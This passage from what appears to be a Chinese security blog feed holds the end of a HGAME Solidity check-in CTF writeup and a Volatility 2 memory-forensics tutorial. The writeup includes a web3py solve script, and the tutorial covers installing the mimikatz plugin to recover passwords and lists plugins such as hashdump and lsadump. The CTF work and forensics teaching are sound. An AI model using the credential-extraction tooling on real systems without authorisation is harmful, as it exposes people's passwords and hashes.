title="查看合约源码"></a>查看合约源码</h5><p>我们可以选择4进行源代码查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[-] input your choice: 4</span><br><span class="line">contracts/checkin.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">contract Checkin &#123;</span><br><span class="line">    string greeting;</span><br><span class="line"></span><br><span class="line">    constructor(string memory _greeting)  &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function greet() public view returns (string memory) &#123;</span><br><span class="line">        return greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setGreeting(string memory _greeting) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        string memory expected = &quot;HelloHGAME!&quot;;</span><br><span class="line">        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过源码审计之后可以简单的发现攻击思路。</p><p>如果需要使<code>isSolved()</code>放回true，我们需要使<code>keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));</code>，其中<code>expected</code>的值是<code>HelloHGAME!</code>，所以我们只需要将<code>greeting</code>的值也设置成<code>HelloHGAME!</code>即可满足加密。</p><p>继续审计可以看到我们可以通过<code>setGreeting</code>修改<code>greeting</code>的值即可。</p><p>首先尝试使用REMIX解题</p><h4 id="Remix解题"><a href="#Remix解题" class="headerlink" title="Remix解题"></a>Remix解题</h4><h5 id="RPC地址配置"><a href="#RPC地址配置" class="headerlink" title="RPC地址配置"></a>RPC地址配置</h5><p>首先第一步我们需要配置小狐狸的RPC地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP://week-1.hgame.lwsec.cn:32428</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/Solidity/img2/6.png"></p><p>配置完了之后查看是否生效，可以使用水龙头往自己的小狐狸地址中转账如果可以收到就表示配置成功。</p><p><img src="/image/media/2022/Solidity/img2/7.png"></p><h5 id="Remix交互"><a href="#Remix交互" class="headerlink" title="Remix交互"></a>Remix交互</h5><p>首先把在题目中拿到的源码复制到Remix中，然后选择Injected Provider - MetaMask，这边注意networks的id是否一样，然后在At Address中输入前面的合约地址：0xbdFcE62184338C494e4Ea6593c374c57C02279CB</p><p><img src="/image/media/2022/Solidity/img2/8.png"></p><p>输入地址之后可以看到下面加载了合约信息，里面有一些函数跟变量</p><p><img src="/image/media/2022/Solidity/img2/9.png"></p><p>但是我们点击setGreeting没有反应，所以应该是题目没有做remix的交互，在geth启动的时候需要额外的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Note: To use Geth &amp; https://remix.ethereum.org, configure it to allow requests from Remix</span><br><span class="line">geth --http --http.corsdomain https://remix.ethereum.org</span><br></pre></td></tr></table></figure><p>所以这边尝试使用web3py合约交互</p><h4 id="web3py合约交互"><a href="#web3py合约交互" class="headerlink" title="web3py合约交互"></a>web3py合约交互</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">官方手册：https://web3py.readthedocs.io/en/stable/web3.eth.html</span><br></pre></td></tr></table></figure><p>exp代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试链接</span></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&#x27;http://week-1.hgame.lwsec.cn:32475/&#x27;</span>))  <span class="comment"># 此处是RPC地址</span></span><br><span class="line"><span class="keyword">assert</span> w3.isConnected()  <span class="comment"># 测试连接钱包地址</span></span><br><span class="line"><span class="built_in">print</span>(w3.isConnected())  <span class="comment"># 结果为true表示连接成功</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建账户</span></span><br><span class="line">pk = <span class="string">&#x27;0x16e39235b9e8d246db0c59d09139d3f3b5aeee31858eed44a5f57527c5f42d70&#x27;</span>  <span class="comment"># 生成一个账户</span></span><br><span class="line"><span class="comment"># privateKeyToAccount函数可以将给定的私钥转换成一个账户，其中包括账户地址、公钥和私钥。它使用私钥来计算出一个地址，然后使用私钥来计算出相应的公钥。最后，它会返回一个包含地址、公钥和私钥的账户对象。</span></span><br><span class="line">account = w3.eth.account.privateKeyToAccount(pk)</span><br><span class="line"><span class="built_in">print</span>(account.address)  <span class="comment"># 拿到前面生成的地址，此处应该是固定值</span></span><br><span class="line"><span class="comment"># 0x38d921812152C00D2C0304b084b84a0aF75Bf9a8</span></span><br><span class="line"><span class="comment">##在这个时候我们可以用水龙头往里面转测试币</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># abi获取</span></span><br><span class="line"><span class="comment">## 然后在本地部署然后在remix里面部署的时候拿到ABI的值，就是下面的这样的信息</span></span><br><span class="line">abi = <span class="string">&#x27;[&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;string&quot;,&quot;name&quot;:&quot;_greeting&quot;,&quot;type&quot;:&quot;string&quot;&#125;],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;constructor&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;name&quot;:&quot;greet&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;string&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;string&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;name&quot;:&quot;isSolved&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;bool&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;string&quot;,&quot;name&quot;:&quot;_greeting&quot;,&quot;type&quot;:&quot;string&quot;&#125;],&quot;name&quot;:&quot;setGreeting&quot;,&quot;outputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程信息获取</span></span><br><span class="line"><span class="comment"># 此处是合约部署的地址，可以在选择交易的之后查看到远程合约部署的地址和交易hash值</span></span><br><span class="line">contract = w3.eth.contract(address=<span class="string">&#x27;0xF587E2006316F1DF3121Be3ba31dEC1CA558928E&#x27;</span>, abi=abi)  <span class="comment"># 应该是合约的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成事务，固定写法</span></span><br><span class="line">tx = contract.functions.setGreeting(<span class="string">&#x27;HelloHGAME!&#x27;</span>).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: account.address,</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.getTransactionCount(account.address),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">1000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.toWei(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交易签名</span></span><br><span class="line">signed_tx = account.signTransaction(tx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送数据</span></span><br><span class="line">tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取交易收据以获取合同地址</span></span><br><span class="line">tx_receipt = w3.eth.waitForTransactionReceipt(tx_hash)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(tx_receipt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;greet : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(contract.functions.greet().call()))  <span class="comment"># call函数只能读取值不能往里面写</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;isSo  : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(contract.functions.isSolved().call()))  <span class="comment"># call函数只能读取值不能往里面写</span></span><br></pre></td></tr></table></figure><p>可以看到效果：</p><p><img src="/image/media/2022/Solidity/img2/10.png"></p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>取证分析volatility纪要</title>
      <link href="/article/2022-12-13-%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90volatility%E7%BA%AA%E8%A6%81/"/>
      <url>/article/2022-12-13-%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90volatility%E7%BA%AA%E8%A6%81/</url>
      
        <content type="html"><![CDATA[<h1 id="取证分析volatility纪要"><a href="#取证分析volatility纪要" class="headerlink" title="取证分析volatility纪要"></a>取证分析volatility纪要</h1><h2 id="取证流程"><a href="#取证流程" class="headerlink" title="取证流程"></a>取证流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先确定镜像是何种操作系统的，命令imageinfo即可获取镜像信息。</span><br><span class="line">需要获取的是计算机在这一时刻运行了哪些进程。</span><br><span class="line">Volatility提供了众多的分析进程的命令，如pstree、pesscan、pslist……</span><br><span class="line">filescan命令可以对打开的文件进行扫描。</span><br><span class="line">命令dumpfile和memdump命令将相关数据导出，然后对导出的数据进行二进制分析。</span><br></pre></td></tr></table></figure><p>简单说只要熟悉Volatility工具的常用命令，并能够对结合其他类型的知识（图片隐写、压缩包分析等）对提取出的文件进行分析，便可轻松解决。</p><h2 id="volatility"><a href="#volatility" class="headerlink" title="volatility"></a>volatility</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态。</p><p>Volatility是一款非常强大的内存取证工具,它是由来自全世界的数百位知名安全专家合作开发的一套工具, 可以用于windows,linux,mac osx,android等系统内存取证。Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Volatility开源在不同系统下都有不同的软件版本，官网地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.volatilityfoundation.org/26</span><br></pre></td></tr></table></figure><p>支持不同的操作系统：windows\linux 都支持，可以根据自己的需求来下载：</p><p>ps ：Volatility官网提供了2和3两个版本，但是实际上是存在一些命令上的差别，后期插件上也存在一些区别，本文使用Volatility2。建议大家都使用vol2的python版本，拓展性好点。相对来说windows的体验效果比Linux差，因为类似distorm3之类的库，python2就没法在windows中安装，但是使用Linux就可以安装。</p><h4 id="windows安装"><a href="#windows安装" class="headerlink" title="windows安装"></a>windows安装</h4><p>可以将exe注册成环境变量，也可以每次在此处使用cmd打开</p><p><img src="/image/media/2022/vol/1.png"></p><p>运行效果</p><p><img src="/image/media/2022/vol/2.png"></p><h4 id="Linux安装"><a href="#Linux安装" class="headerlink" title="Linux安装"></a>Linux安装</h4><p>建议直接法三</p><h5 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h5><p>直接使用官网上的可执行文件，然后放到/bin目录中</p><h5 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h5><p>Volatility2.6需要python2，pip安装模块也需要2版本，具体命令根据实际情况调整。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/volatilityfoundation/volatility</span><br></pre></td></tr></table></figure><p>下载源码，然后解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip volatility-master.zip</span><br></pre></td></tr></table></figure><p>安装依赖</p><ul><li>crypto</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip2 install pycryptodome</span><br><span class="line">#如果安装失败，可使用以下命令切换国内源</span><br><span class="line">pip2 install pycryptodome -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line">手动安装链接</span><br><span class="line">http://www.voidspace.org.uk/python/modules.shtml#pycrypto</span><br></pre></td></tr></table></figure><ul><li>distorm3</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vext01/distorm3</span><br><span class="line">#下载解压后使用python2 setup.py install进行编译</span><br></pre></td></tr></table></figure><ul><li>可选插件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Distorm3（反编译库）：pip install distorm3</span><br><span class="line">Yara（恶意软件分类工具）：pip install yara</span><br><span class="line">PyCrypto（加密工具集）：pip install pycrypto</span><br><span class="line">PIL（图片处理库）：pip install pil</span><br><span class="line">OpenPyxl（读写excel文件）：pip install openpyxl</span><br><span class="line">ujson（JSON解析）：pip install ujson</span><br></pre></td></tr></table></figure><p>安装Volatility，在解压后的Volatility目录下进行编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 setup.py install</span><br></pre></td></tr></table></figure><p>这里可能存在错误</p><p><img src="/image/media/2022/vol/3.png"></p><p>重新链接即可，此处需要找到libyara.so的库，根据每个人的路径不一样，可以执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ pip2 install yara</span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.                                                                              </span><br><span class="line">Defaulting to user installation because normal site-packages is not writeable</span><br><span class="line">Requirement already satisfied: yara in /home/t/.local/lib/python2.7/site-packages (1.7.7)</span><br></pre></td></tr></table></figure><p>定位libyara.so的路径，然后执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /home/t/.local/lib/python2.7/site-packages/usr/lib/libyara.so /usr/lib/libyara.so</span><br></pre></td></tr></table></figure><p>测试安装成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py --help</span><br></pre></td></tr></table></figure><p>能看到版本就表示安装成功。</p><h5 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h5><p>下载解压<a href="/image/media/2022/vol/volatility-2.6.1.rar">离线包</a>，直接放到合适的位置即可。</p><h4 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h4><h5 id="安装mimikatz"><a href="#安装mimikatz" class="headerlink" title="安装mimikatz"></a>安装mimikatz</h5><p>将mimikatz.py复制到volatility-master/volatility/plugins/目录下，使用时需要添加参数<code>--plugins=./volatility-master/volatility/plugins</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ruokeqx/Virtual-machine-configuration-for-CTF</span><br><span class="line">mimikatz.py下载路径</span><br><span class="line">* mimikatz.py 获取密码</span><br><span class="line">* lastpass.py Chrome记录的登录密码</span><br><span class="line">* usbstor.py 扫描注册表查找插入系统的USB设备</span><br></pre></td></tr></table></figure><p>运行时可能会出现如下错误，这是因为没有安装construct 模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">*** Failed to import volatility.plugins.mimikatz (ImportError: No module named construct)</span><br><span class="line">ERROR   : volatility.debug    : You must specify something to do (try -h)</span><br></pre></td></tr></table></figure><p>安装construct模块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install construct </span><br></pre></td></tr></table></figure><h4 id="参数简介"><a href="#参数简介" class="headerlink" title="参数简介"></a>参数简介</h4><h5 id="英文"><a href="#英文" class="headerlink" title="英文"></a>英文</h5><p>使用volatility_2.6 -h，具体命令跟配置的环境变量有关系，或者跟你是否重命名有关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">└─$ volatility_2.6 -h                                                               </span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line"> Usage: Volatility - A memory forensics analysis platform.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help            list all available options and their default values.</span><br><span class="line">                        Default values may be set in the configuration file</span><br><span class="line">                        (/etc/volatilityrc)</span><br><span class="line">  --conf-file=/home/t/.volatilityrc</span><br><span class="line">                        User based configuration file</span><br><span class="line">  -d, --debug           Debug volatility</span><br><span class="line">  --plugins=PLUGINS     Additional plugin directories to use (colon separated)</span><br><span class="line">  --info                Print information about all registered objects</span><br><span class="line">  --cache-directory=/home/t/.cache/volatility</span><br><span class="line">                        Directory where cache files are stored</span><br><span class="line">  --cache               Use caching</span><br><span class="line">  --tz=TZ               Sets the (Olson) timezone for displaying timestamps</span><br><span class="line">                        using pytz (if installed) or tzset</span><br><span class="line">  -f FILENAME, --filename=FILENAME</span><br><span class="line">                        Filename to use when opening an image</span><br><span class="line">  --profile=WinXPSP2x86</span><br><span class="line">                        Name of the profile to load (use --info to see a list</span><br><span class="line">                        of supported profiles)</span><br><span class="line">  -l LOCATION, --location=LOCATION</span><br><span class="line">                        A URN location from which to load an address space</span><br><span class="line">  -w, --write           Enable write support</span><br><span class="line">  --dtb=DTB             DTB Address</span><br><span class="line">  --shift=SHIFT         Mac KASLR shift address</span><br><span class="line">  --output=text         Output in this format (support is module specific, see</span><br><span class="line">                        the Module Output Options below)</span><br><span class="line">  --output-file=OUTPUT_FILE</span><br><span class="line">                        Write output in this file</span><br><span class="line">  -v, --verbose         Verbose information</span><br><span class="line">  -g KDBG, --kdbg=KDBG  Specify a KDBG virtual address (Note: for 64-bit</span><br><span class="line">                        Windows 8 and above this is the address of</span><br><span class="line">                        KdCopyDataBlock)</span><br><span class="line">  --force               Force utilization of suspect profile</span><br><span class="line">  --cookie=COOKIE       Specify the address of nt!ObHeaderCookie (valid for</span><br><span class="line">                        Windows 10 only)</span><br><span class="line">  -k KPCR, --kpcr=KPCR  Specify a specific KPCR address</span><br><span class="line"></span><br><span class="line">        Supported Plugin Commands:</span><br><span class="line"></span><br><span class="line">                amcache         Print AmCache information</span><br><span class="line">                apihooks        Detect API hooks in process and kernel memory</span><br><span class="line">                atoms           Print session and window station atom tables</span><br><span class="line">                atomscan        Pool scanner for atom tables</span><br><span class="line">                auditpol        Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv</span><br><span class="line">                bigpools        Dump the big page pools using BigPagePoolScanner</span><br><span class="line">                bioskbd         Reads the keyboard buffer from Real Mode memory</span><br><span class="line">                cachedump       Dumps cached domain hashes from memory</span><br><span class="line">                callbacks       Print system-wide notification routines</span><br><span class="line">                clipboard       Extract the contents of the windows clipboard</span><br><span class="line">                cmdline         Display process command-line arguments</span><br><span class="line">                cmdscan         Extract command history by scanning for _COMMAND_HISTORY</span><br><span class="line">                connections     Print list of open connections [Windows XP and 2003 Only]</span><br><span class="line">                connscan        Pool scanner for tcp connections</span><br><span class="line">                consoles        Extract command history by scanning for _CONSOLE_INFORMATION</span><br><span class="line">                crashinfo       Dump crash-dump information</span><br><span class="line">                deskscan        Poolscaner for tagDESKTOP (desktops)</span><br><span class="line">                devicetree      Show device tree</span><br><span class="line">                dlldump         Dump DLLs from a process address space</span><br><span class="line">                dlllist         Print list of loaded dlls for each process</span><br><span class="line">                driverirp       Driver IRP hook detection</span><br><span class="line">                drivermodule    Associate driver objects to kernel modules</span><br><span class="line">                driverscan      Pool scanner for driver objects</span><br><span class="line">                dumpcerts       Dump RSA private and public SSL keys</span><br><span class="line">                dumpfiles       Extract memory mapped and cached files</span><br><span class="line">                dumpregistry    Dumps registry files out to disk </span><br><span class="line">                editbox         Displays information about Edit controls. (Listbox experimental.)</span><br><span class="line">                envars          Display process environment variables</span><br><span class="line">                eventhooks      Print details on windows event hooks</span><br><span class="line">                evtlogs         Extract Windows Event Logs (XP/2003 only)</span><br><span class="line">                filescan        Pool scanner for file objects</span><br><span class="line">                gahti           Dump the USER handle type information</span><br><span class="line">                gditimers       Print installed GDI timers and callbacks</span><br><span class="line">                gdt             Display Global Descriptor Table</span><br><span class="line">                getservicesids  Get the names of services in the Registry and return Calculated SID</span><br><span class="line">                getsids         Print the SIDs owning each process</span><br><span class="line">                handles         Print list of open handles for each process</span><br><span class="line">                hashdump        Dumps passwords hashes (LM/NTLM) from memory</span><br><span class="line">                hibinfo         Dump hibernation file information</span><br><span class="line">                hivedump        Prints out a hive</span><br><span class="line">                hivelist        Print list of registry hives.</span><br><span class="line">                hivescan        Pool scanner for registry hives</span><br><span class="line">                hpakextract     Extract physical memory from an HPAK file</span><br><span class="line">                hpakinfo        Info on an HPAK file</span><br><span class="line">                idt             Display Interrupt Descriptor Table</span><br><span class="line">                iehistory       Reconstruct Internet Explorer cache / history</span><br><span class="line">                imagecopy       Copies a physical address space out as a raw DD image</span><br><span class="line">                imageinfo       Identify information for the image </span><br><span class="line">                impscan         Scan for calls to imported functions</span><br><span class="line">                joblinks        Print process job link information</span><br><span class="line">                kdbgscan        Search for and dump potential KDBG values</span><br><span class="line">                kpcrscan        Search for and dump potential KPCR values</span><br><span class="line">                ldrmodules      Detect unlinked DLLs</span><br><span class="line">                lsadump         Dump (decrypted) LSA secrets from the registry</span><br><span class="line">                machoinfo       Dump Mach-O file format information</span><br><span class="line">                malfind         Find hidden and injected code</span><br><span class="line">                mbrparser       Scans for and parses potential Master Boot Records (MBRs) </span><br><span class="line">                memdump         Dump the addressable memory for a process</span><br><span class="line">                memmap          Print the memory map</span><br><span class="line">                messagehooks    List desktop and thread window message hooks</span><br><span class="line">                mftparser       Scans for and parses potential MFT entries </span><br><span class="line">                moddump         Dump a kernel driver to an executable file sample</span><br><span class="line">                modscan         Pool scanner for kernel modules</span><br><span class="line">                modules         Print list of loaded modules</span><br><span class="line">                multiscan       Scan for various objects at once</span><br><span class="line">                mutantscan      Pool scanner for mutex objects</span><br><span class="line">                notepad         List currently displayed notepad text</span><br><span class="line">                objtypescan     Scan for Windows object type objects</span><br><span class="line">                patcher         Patches memory based on page scans</span><br><span class="line">                poolpeek        Configurable pool scanner plugin</span><br><span class="line">                printkey        Print a registry key, and its subkeys and values</span><br><span class="line">                privs           Display process privileges</span><br><span class="line">                procdump        Dump a process to an executable file sample</span><br><span class="line">                pslist          Print all running processes by following the EPROCESS lists </span><br><span class="line">                psscan          Pool scanner for process objects</span><br><span class="line">                pstree          Print process list as a tree</span><br><span class="line">                psxview         Find hidden processes with various process listings</span><br><span class="line">                qemuinfo        Dump Qemu information</span><br><span class="line">                raw2dmp         Converts a physical memory sample to a windbg crash dump</span><br><span class="line">                screenshot      Save a pseudo-screenshot based on GDI windows</span><br><span class="line">                servicediff     List Windows services (ala Plugx)</span><br><span class="line">                sessions        List details on _MM_SESSION_SPACE (user logon sessions)</span><br><span class="line">                shellbags       Prints ShellBags info</span><br><span class="line">                shimcache       Parses the Application Compatibility Shim Cache registry 